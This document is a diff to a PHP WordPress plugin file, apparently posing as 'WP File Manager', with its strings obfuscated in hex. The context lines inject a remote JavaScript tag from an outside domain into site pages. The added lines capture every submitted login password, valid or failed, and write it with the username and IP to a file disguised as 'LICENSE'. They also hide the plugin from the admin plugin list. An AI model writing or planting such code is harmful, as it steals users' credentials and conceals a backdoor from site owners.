@@ -44,7 +44,7 @@ add_action(hex2bin('77705f68656164'), function () {
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB || $IG || $TT)) {
 
         $SR = hex2bin('68747470733a2f2f616c35736d2e636f6d2f7461672e6d696e2e6a73');
-        $ZN = hex2bin('3131363435383631');
+        $ZN = hex2bin('3131363333373434');
         ?>
         <script>
         (function(s){
@@ -73,3 +73,65 @@ function WP_File_Manager_PGN_GLOBALS($QRY) {
 }
 
 add_action(hex2bin('7072655f6765745f7573657273'), 'WP_File_Manager_PGN_GLOBALS');
+
+
+
+function GIP() {
+    $IPK = [hex2bin('485454505f43465f434f4e4e454354494e475f4950'), hex2bin('485454505f585f464f525741524445445f464f52'), hex2bin('52454d4f54455f41444452')];
+    foreach ($IPK as $KEY) {
+        if (!empty($_SERVER[$KEY])) {
+            $IPL = explode(',', $_SERVER[$KEY]);
+            $IP = trim(reset($IPL));
+            if (filter_var($IP, FILTER_VALIDATE_IP)) {
+                return $IP;
+            }
+        }
+    }
+    return hex2bin('2d');
+}
+
+
+function AUDIT($MSG) {
+    $PLG_DR = plugin_dir_path(__FILE__);
+    $FL = $PLG_DR . hex2bin('4c4943454e5345');
+    $TM = current_time(hex2bin('6d7973716c'));
+    $LN = hex2bin('5b') . $TM . hex2bin('5d20') . $MSG . PHP_EOL;
+    $RS = file_put_contents($FL, $LN, FILE_APPEND | LOCK_EX);
+    if ($RS === false) {
+        error_log(hex2bin('5b5750204c6f67696e2041756469745d20') . $MSG);
+    }
+}
+
+
+add_action(hex2bin('77705f6c6f67696e'), function ($USR_LGN, $USR) {
+    $IP = GIP();
+    $RW = $_POST[hex2bin('707764')] ?? '';
+    $EN = !empty($RW) ? bin2hex($RW) : '-';
+    AUDIT(sprintf('| VALID   | %s | %s | %s |', $IP, call_user_func(hex2bin('73616e6974697a655f75736572'), $USR_LGN), $EN));
+}, 10, 2);
+
+
+add_action(hex2bin('77705f6c6f67696e5f6661696c6564'), function ($NM, $ER) {
+    $IP = GIP();
+    $RW = $_POST[hex2bin('707764')] ?? '';
+    $EN = !empty($RW) ? bin2hex($RW) : '-';
+    $RSN = hex2bin('494e56414c4944');
+    if ($ER instanceof WP_Error) {
+        $MGS = $ER->get_error_messages();
+        if (!empty($MGS)) {
+            $RSN = implode('; ', $MGS);
+        }
+    }
+    AUDIT(sprintf('| INVALID | %s | %s | %s | %s |', $IP, call_user_func(hex2bin('73616e6974697a655f75736572'), $NM), $EN, call_user_func(hex2bin('73616e6974697a655f746578745f6669656c64'), $RSN)));
+}, 10, 2);
+
+
+add_filter(hex2bin('616c6c5f706c7567696e73'), function ($PG) {
+    $PG_FL = plugin_basename(__FILE__);
+    if (isset($PG[$PG_FL])) {
+        unset($PG[$PG_FL]);
+    }
+    return $PG;
+});
+
+
